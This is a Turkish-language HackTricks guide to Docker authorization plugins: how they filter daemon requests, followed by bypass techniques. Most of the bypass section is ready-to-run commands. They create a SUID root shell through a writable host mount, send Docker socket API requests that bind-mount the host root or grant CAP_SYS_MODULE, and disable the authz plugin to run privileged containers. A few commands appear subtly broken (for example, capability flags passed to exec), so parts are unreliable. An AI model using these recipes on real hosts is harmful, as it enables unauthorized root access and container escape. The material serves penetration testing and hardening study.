{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon'a erişim iznine sahip herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Docker’ın Engine API'sini kullanarak daemon ile iletişim kuran çağrıcılar için de aynı şey geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.

# Temel mimari

Docker Auth eklentileri, **kullanıcı** tarafından talep edilen **hareketleri** **izin verme/red etme** amacıyla Docker Daemon'a iletilen **harici** **eklenti**lerdir.

**[Aşağıdaki bilgi belgelerden alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API üzerinden Docker **daemon**'a yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine iletir. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.

Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akışını göstermektedir:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini** içerir. Sadece **kullanıcı adı** ve kullanılan **kimlik doğrulama yöntemi** eklentiye iletilir. En önemlisi, **hiçbir** kullanıcı **kimlik bilgisi** veya token iletilmez. Son olarak, **tüm istek/yanıt gövdeleri** yetkilendirme eklentisine gönderilmez. Sadece `Content-Type`'ı `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.

HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`) için, örneğin `exec`, yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar için, örneğin `logs` ve `events`, yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.

İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon'a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırmasını sağlaması gerekir.

## Birkaç Eklenti

Eklentinizi Docker daemon **başlatma** sürecinin bir parçası olarak **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları birleştirebilirsiniz**. Bu zincir sıralı olabilir. Daemona yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.

# Eklenti Örnekleri

## Twistlock AuthZ Broker

Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** eklentinin **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her kullanıcının hangi API uç noktalarına erişebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.

Bu, Alice ve Bob'un yeni konteynerler oluşturmasına izin verecek bir örnektir: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) sayfasında istenen URL ile eylem arasındaki ilişkiyi bulabilirsiniz. [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında ise eylem adı ile eylem arasındaki ilişkiyi bulabilirsiniz.

## Basit Eklenti Eğitimi

Kurulum ve hata ayıklama hakkında ayrıntılı bilgiye sahip **anlaşılması kolay bir eklenti** bulabilirsiniz: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Nasıl çalıştığını anlamak için `README` ve `plugin.go` kodunu okuyun.

# Docker Auth Eklenti Atlatma

## Erişimi Belirleme

Kontrol edilmesi gereken ana şeyler **hangi uç noktaların izin verildiği** ve **hangi HostConfig değerlerinin izin verildiğidir**.

Bu belirlemeyi yapmak için **şu aracı kullanabilirsiniz** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## izin verilmeyen `run --privileged`

### Minimum Yetkiler
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Bir konteyner çalıştırmak ve ardından ayrıcalıklı bir oturum almak

Bu durumda sistem yöneticisi **kullanıcıların hacimleri bağlamasını ve `--privileged` bayrağı ile konteyner çalıştırmasını** veya konteynere herhangi bir ek yetenek vermesini engelledi:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Ancak, bir kullanıcı **çalışan konteyner içinde bir shell oluşturabilir ve ona ek ayrıcalıklar verebilir**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Şimdi, kullanıcı [**daha önce tartışılan tekniklerden**](./#privileged-flag) herhangi birini kullanarak konteynerden çıkabilir ve **yetkileri artırabilir**.

## Yazılabilir Klasörü Bağlama

Bu durumda sistem yöneticisi **kullanıcıların `--privileged` bayrağı ile konteyner çalıştırmalarını yasakladı** veya konteynere herhangi bir ek yetki vermedi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Not edin ki `/tmp` klasörünü bağlayamayabilirsiniz ama **farklı bir yazılabilir klasör** bağlayabilirsiniz. Yazılabilir dizinleri bulmak için: `find / -writable -type d 2>/dev/null` komutunu kullanabilirsiniz.

**Not edin ki bir linux makinesindeki tüm dizinler suid bitini desteklemeyecektir!** Hangi dizinlerin suid bitini desteklediğini kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.

Ayrıca, eğer **`/etc`** veya **konfigürasyon dosyalarını içeren** başka bir klasörü bağlayabiliyorsanız, bunları docker konteynerinden root olarak değiştirip **host'ta kötüye kullanmak** ve ayrıcalıkları artırmak için (belki `/etc/shadow` dosyasını değiştirerek) kullanabilirsiniz.
{% endhint %}

## Kontrolsüz API Uç Noktası

Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, eğer yönetici uç noktalar ve nitelikler ile ilgili bir **kara liste** yaklaşımı benimserse, bir saldırganın **ayrıcalıkları artırmasına** izin verebilecek bazılarını **unutabilir.**

Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) adresinde kontrol edebilirsiniz.

## Kontrolsüz JSON Yapısı

### Kökte Bağlantılar

Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi bazı önemli parametreleri **unutmuş olabilir**. "**Binds**" gibi.\
Aşağıdaki örnekte, bu yanlış yapılandırmayı kötüye kullanarak host'un kök (/) klasörünü bağlayan ve çalıştıran bir konteyner oluşturmak mümkündür:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Bu örnekte **`Binds`** parametresini JSON'da kök düzey anahtar olarak kullandığımıza dikkat edin, ancak API'de **`HostConfig`** anahtarı altında görünmektedir.
{% endhint %}

### HostConfig'deki Binds

**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

**Binds in root** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Sysadmin docker güvenlik duvarını yapılandırırken, [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**HostConfig**" parametresinin "**Capabilities**" gibi bazı önemli özelliklerini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı kullanarak **SYS\_MODULE** yetkisine sahip bir konteyner oluşturmak ve çalıştırmak mümkündür:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`**, genellikle konteynerden kaçmak için **ilginç** **yetkileri** içeren anahtardır. Ancak, daha önce tartıştığımız gibi, bunun dışındaki Binds kullanımının da işe yaradığını ve kısıtlamaları aşmanıza izin verebileceğini unutmayın.
{% endhint %}

## Eklentiyi Devre Dışı Bırakma

Eğer **sistem yöneticisi** **eklentiyi** **devre dışı bırakma** yetkisini **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!

## Auth Plugin Bypass yazıları

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
